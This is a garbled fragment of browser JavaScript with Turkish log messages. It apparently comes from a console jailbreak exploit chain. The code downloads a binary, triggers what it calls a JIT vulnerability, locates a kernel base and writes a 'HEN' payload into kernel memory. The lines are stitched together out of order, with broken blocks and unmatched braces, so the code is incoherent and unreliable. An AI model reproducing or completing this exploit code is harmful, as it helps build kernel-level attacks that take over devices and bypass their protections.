<script>

                xhr.overrideMimeType('text/plain; charset=x-user-defined');
                xhr.send();
                if (xhr.status === 200) {
                    var raw = xhr.responseText;
                    var bytes = new Uint8Array(raw.length);

                return x.a + x.b;

                jitFunction(arr[i % 0x1000]);
            }
            logDiv.textContent += '[*] JIT zafiyeti başarılı.\n';
            return {a: 0x41414141, b: 0x42424242};

        // 5. Kernel yazma
        function writeToKernel(henData, kernelAddr) {
            logDiv.textContent += '[*] Kernel hafızasına yazılıyor (0x' + kernelAddr.toString(16) + ')...\n';

                return;

            var kernelHenAddr = kernelBase + 0x80000;
            writeToKernel(henBinary, kernelHenAddr);

            logDiv.textContent += '[+] Kernel taban: 0x' + kernelBase.toString(16) + '\n';

})();
</script>
